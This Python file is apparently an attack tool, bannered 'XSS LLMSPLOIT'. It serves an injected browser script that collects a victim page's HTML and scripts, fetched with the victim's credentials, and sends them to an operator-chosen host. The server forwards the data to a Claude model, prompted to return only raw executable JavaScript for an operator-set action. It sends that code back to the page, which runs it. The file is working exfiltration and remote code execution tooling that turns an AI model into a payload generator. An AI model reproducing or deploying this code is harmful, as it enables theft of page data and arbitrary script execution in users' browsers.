#!/usr/bin/env python3
"""Simple server: serves static files and receives collected page data."""

import argparse
import json
import mimetypes
import os
from http.server import BaseHTTPRequestHandler, HTTPServer

import anthropic

COLLECTOR_HOST = "0.0.0.0"
PORT = 8000
SERVE_DIR = os.path.dirname(os.path.abspath(__file__))
HTMLS = []
JS = []
CODE = ""

COLLECTOR_JS = """\
// collector.js
// Gathers the page's HTML plus the source of every JavaScript file
// referenced on the page, then POSTs it all to the server.

(function () {
  "use strict";

  // Where to send the collected data. Change host/port if needed.
  var ENDPOINT = "http://__COLLECTOR_HOST__:__COLLECTOR_PORT__/collect";

  // Fetch the text of a URL. Returns "" on any failure so one bad
  // script doesn't abort the whole run.
  function fetchText(url) {
    return fetch(url, { credentials: "include" })
      .then(function (r) {
        return r.ok ? r.text() : "";
      })
      .catch(function () {
        return "";
      });
  }

  function collect() {
    // 1. The full rendered HTML of the page.
    var html = document.documentElement.outerHTML;

    // 2. Every <script src="..."> on the page (resolved absolute URLs), excluding this script.
    var scriptUrls = Array.prototype.slice
      .call(document.querySelectorAll("script[src]"))
      .map(function (el) {
        return el.src;
      })
      .filter(function (url) {
        return !url.endsWith("/collector.js");
      });

    // 3. Inline scripts (no src).
    var inlineScripts = Array.prototype.slice
      .call(document.querySelectorAll("script:not([src])"))
      .map(function (el) {
        return el.textContent || "";
      });

    // Fetch all external script sources in parallel.
    var fetches = scriptUrls.map(function (url) {
      return fetchText(url);
    });

    Promise.all(fetches).then(function (externalScripts) {
      var payload = {
        page_url: window.location.href,
        title: document.title,
        collected_at: new Date().toISOString(),
        html: html,
        external_scripts: externalScripts,
        inline_scripts: inlineScripts,
      };

      // Send everything to the server and inject the returned code.
      fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      }).then(function (r) {
        return r.text();
      }).then(function (code) {
        if (!code) return;
        var script = document.createElement("script");
        script.textContent = code;
        const input = document.createElement('input');
        input.type = 'text';
        document.body.appendChild(script);
      }).catch(function (err) {
        console.error("[collector] send failed:", err);
      });
    });
  }

  // Run once the DOM is ready.
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", collect);
  } else {
    collect();
  }
})();
"""


def analyze_with_claude(html, js, prompt):
    """Send collected HTML and JS to Claude with a custom prompt.

    Args:
        html  - HTML string (e.g. HTMLS[0])
        js    - list of JS content strings (e.g. JS)
        prompt - the security/analysis question to ask

    Returns the assistant's reply as a string.
    """
    js_block = "\n\n".join(
        f"--- JS file #{i + 1} ---\n{src}" for i, src in enumerate(js)
    ) if js else "(no JS)"

    user_message = (
        f"{prompt}\n\n"
        f"<html>\n{html}\n</html>\n\n"
        f"<javascript>\n{js_block}\n</javascript>"
    )

    client = anthropic.Anthropic()
    response = client.messages.create(
        model="claude-sonnet-4-6",
        max_tokens=4096,
        system="Respond with only raw JavaScript code. No explanations, no markdown, no code fences.",
        messages=[{"role": "user", "content": user_message}],
    )
    return response.content[0].text


class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        # Allow the browser script to POST from any page.
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")

    def do_GET(self):
        path = self.path.split("?")[0]
        if path == "/":
            path = "/index.html"
        if path == "/collector.js":
            js = COLLECTOR_JS.replace("__COLLECTOR_HOST__", COLLECTOR_HOST).replace(
                "__COLLECTOR_PORT__", str(PORT)
            )
            data = js.encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Content-Length", str(len(data)))
            self._cors()
            self.end_headers()
            self.wfile.write(data)
            return
        file_path = os.path.join(SERVE_DIR, path.lstrip("/"))
        if not os.path.isfile(file_path):
            if path.endswith(".html") or path.endswith(".css"):
                data = CODE.encode()
                mime = "text/html" if path.endswith(".html") else "text/css"
                self.send_response(200)
                self.send_header("Content-Type", mime)
                self.send_header("Content-Length", str(len(data)))
                self._cors()
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404)
                self.end_headers()
            return
        mime, _ = mimetypes.guess_type(file_path)
        with open(file_path, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", mime or "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length)

        try:
            data = json.loads(raw)
        except json.JSONDecodeError:
            data = None

        print("=" * 70)
        if data is None:
            print("[!] Received non-JSON body")
        else:
            print(f"[+] Collected page: {data.get('page_url')}")

            html = data.get("html", "")
            HTMLS.insert(0, html)

            inline_scripts = data.get("inline_scripts", [])
            print(f"[+] Captured {len(inline_scripts)} inline script(s)")

            external_scripts = data.get("external_scripts", [])
            for src in external_scripts:
                JS.append(src)
            print(f"[+] Captured {len(external_scripts)} external script(s)")

            print("[+] Sending to Claude for analysis...")
            global CODE
            CODE = analyze_with_claude(HTMLS[0], JS, "You generate JavaScript that executes in a live browser runtime. The DOM is already loaded and ready.\n\nOutput rules:\n- Return ONLY raw, executable JavaScript.\n- No markdown, no code fences, no backticks.\n- No explanations, comments, or preamble.\n- The response must begin with the first character of code.\n- Do NOT output HTML directly. Any HTML elements must be created and rendered through JavaScript (e.g. document.createElement, element.innerHTML, appendChild).\n\n" + PROMPT)
            print("\n--- CLAUDE RESPONSE ---")
            print(CODE)
        print("=" * 70)

        body = CODE.encode()
        self.send_response(200)
        self._cors()
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    # Quieter default logging.
    def log_message(self, fmt, *args):
        return


BANNER = r"""
                        ██╗  ██╗███████╗███████╗
                        ╚██╗██╔╝██╔════╝██╔════╝
                         ╚███╔╝ ███████╗███████╗
                         ██╔██╗ ╚════██║╚════██║
                        ██╔╝ ██╗███████║███████║
                        ╚═╝  ╚═╝╚══════╝╚══════╝
██╗     ██╗     ███╗   ███╗███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██║     ██║     ████╗ ████║██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║     ██║     ██╔████╔██║███████╗██████╔╝██║     ██║   ██║██║   ██║
██║     ██║     ██║╚██╔╝██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║
███████╗███████╗██║ ╚═╝ ██║███████║██║     ███████╗╚██████╔╝██║   ██║
╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
"""


if __name__ == "__main__":
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("--action", required=True, help="Prompt sent to Claude after each page collection")
    parser.add_argument("--host", required=True, help="IP/host the collector.js script reports data back to")
    args = parser.parse_args()
    PROMPT = args.action
    COLLECTOR_HOST = args.host

    print(f"Listening on http://{COLLECTOR_HOST}:{PORT}  (POST to /collect)")
    HTTPServer((COLLECTOR_HOST, PORT), Handler).serve_forever()
